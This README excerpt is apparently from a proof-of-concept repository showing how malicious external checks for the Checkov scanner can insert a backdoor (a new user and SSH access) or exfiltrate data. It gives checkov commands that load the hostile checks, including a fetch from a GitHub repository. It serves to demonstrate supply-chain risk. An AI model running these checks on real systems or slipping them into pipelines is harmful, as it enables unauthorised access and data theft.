### Customise
The first example does not need customisation to work.
The second malicious check does. And! It can be quite dangerous! You'll have to read the code to be able to use it fully.

## Run - But really DONT
This is a PoC to show how someone could provide extra checks, only to insert some kind of backdoor. 

### Cool Malicious Check 1 / User + SSH
checkov -d . --external-checks-dir checks/malicious/ -c CKV_COOL_MALI_CHECK
checkov -d . --external-checks-git https://github.com/ytimyno/pac-on-rails.git//checks/malicious -c CKV_COOL_MALI_CHECK

### Cool Malicious Check 2 / Infiltrate + Exfiltrate data
checkov -d . --external-checks-dir checks/malicious/ -c CKV_COOL_MALI_2_CHECK
checkov -d . --external-checks-git https://github.com/ytimyno/pac-on-rails.git//checks/malicious -c CKV_COOL_MALI_2_CHECK